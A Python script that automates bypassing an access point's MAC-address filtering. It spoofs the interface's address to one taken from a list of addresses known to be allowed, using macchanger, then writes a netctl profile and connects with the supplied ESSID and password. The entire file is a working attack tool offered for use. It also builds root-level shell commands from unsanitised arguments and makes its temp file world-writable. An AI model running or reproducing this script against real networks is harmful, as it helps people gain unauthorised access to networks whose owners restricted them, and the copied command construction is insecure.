#!/usr/bin/python

#Automates the process of bypassing mac filtering of an access point

from sys import argv, exit
import random
from os import getuid, path, remove
import subprocess

version="[v1.0]"
tad="15/2/2017 16:34"

configuration_file="bypass_config.txt"
temporary_file="bypass_temp.txt"
netctl_path="/etc/netctl/"
profile="bypass_profile"

def error(message):
	print(argv[0] + ": Error: " + message)
	exit()

def checkRootPrivileges():
	if getuid() == 0:
		return True

	return False

def execute(command):
	subprocess.call(command, stdout=subprocess.PIPE, shell=True)

def readFile(filename):
	lines = [line.rstrip('\n') for line in open(filename)]

	return lines

def stop():
	message = "Please run 'macchanger -p <interface>' to reset the BSSID of the interface and remove the files: '" + netctl_path + profile + "' and '" + temporary_file + "'"

	if not path.isfile(temporary_file):
		error("Temporary file '" + temporary_file + "' doesn't exist.\n" + message)

	interface = readFile(temporary_file)

	if len(interface) == 0:
		error("Corrupted temporary file (" + temporary_file + ").\n" + message)

	print("Disconnecting from network...")
	execute("netctl stop " + profile)
	print("Resetting BSSID of interface '" + interface[0] + "'...")
	execute("macchanger -p " + interface[0])

	print("Removing files: '" + netctl_path + profile + "', '" + temporary_file + "'")
	remove(temporary_file)
	if path.isfile(netctl_path + profile):
		remove(netctl_path + profile)
	else:
		print("\nThe file '" + netctl_path + profile + "' does not exist. You will propably not be able to connect to any networks now. The only known solution to this bug is to restart your computer.")
		exit()

def verifyArguments():
	if len(argv) > 1:
		if argv[1] == "stop":
			stop()
			exit()
		elif argv[1] == "help":
			print("\nDependencies:")
			print("For this script to work, the 'netctl' and 'macchanger' packages need to be installed and the ifconfig command should be available (part of the net-tools package).\n")

			print("What it does:")
			print("This script automates the process of bypassing mac filtering of an access point. It takes the ESSID and password of the network to connect to as an argument, as well as the interface to be used and a file in which BSSIDs that are known to be allowed to connect to the network are listed. The script changes the BSSID of the interface to one of the listed BSSIDs and connects to the network.")
			print("Optionally, a configuration file (configuration_file) can be set up. If a configuration file exists, the script can be executed without arguments.\n")

			print("Set up a configuration file:\nThe file's name  needs to be 'configuration_file', and it's contents should be structured as follows:\n")

			print("\t<ESSID of the network to connect to>")
			print("\t<Password of the network to connect to>")
			print("\t<Interface to be used>")
			print("\t<Name of the file, in which the known BSSIDs are listed>")
			print("\n\t(Each item should be written on a new line)\n")

			print("Usage: '" + argv[0] + " <ESSID> <Password> <Interface> <File>'")
			print("Example: '" + argv[0] + " WIND_WIFI 12345 wlan0 BSSIDs.txt'")

			exit()

	if not path.isfile(configuration_file):
		if len(argv) < 5:
			error("Not enough arguments. Use the argument 'help' for help")


def changeBssid(interface, bssid):
	execute("ifconfig " + interface + " down")
	execute("macchanger -m " + bssid + " " + interface)

def connect(interface, essid, password):
	filename= netctl_path + profile

	output = "Description='Automatically generated profile for " + argv[0] + "'\n"
	output += "Interface=" + interface + "\n"
	output += "Connection=wireless\nSecurity=wpa\n"
	output += "ESSID='" + essid + "'\n"
	output += "IP=dhcp\nKey=" + password + "\n"

	file = open(filename, 'w')
	file.write(output)
	file.close()

	execute("netctl start " + profile)

def main():
	print(argv[0] + " " + version + "\nDevelopment started " + tad + "\n")
	verifyArguments()

	if not checkRootPrivileges():
		error("Error: This script requires root privileges")

	if path.isfile(temporary_file):
		error("Temporary file (" + temporary_file + ") detected. Please run '" + argv[0] + " stop' to stop the last session before continuing")

	essid = None
	password = None
	interface = None
	bssid_file = None

	if path.isfile(configuration_file):
		print("Reading configuration file...")
		output = readFile(configuration_file)

		if len(output) != 4:
			error("Corrupted configuration file")
		essid, password, interface, bssid_file = output
	else:
		essid = argv[1]
		password = argv[2]
		interface = argv[3]
		bssid_file = argv[4]


	temp_file = open(temporary_file, 'w')
	temp_file.write(interface)
	temp_file.close()

	execute("chmod 666 " + temporary_file)

	print("\nReading BSSIDs from file '" + bssid_file + "'...")
	bssids = readFile(bssid_file)
	if len(bssids) == 0:
		error("No BSSIDs listed in file")
	print("Read " + str(len(bssids)) + " BSSIDs")

	print("\nChanging BSSID of interface '" + interface + "'...")
	bssid = bssids[random.randint(0, len(bssids) - 1)]
	changeBssid(interface, bssid)
	print("Changed BSSID to '" + bssid + "'")

	print("\nConnecting to network '" + essid + "'...")
	connect(interface, essid, password)
	print("Connected")

	print("\nWhen you are done, run '" + argv[0] + " stop'. This will disconnect you from the network, reset the BSSID of the interface '" + interface + "' and delete files that were created during the initial execution of the script.")

main()
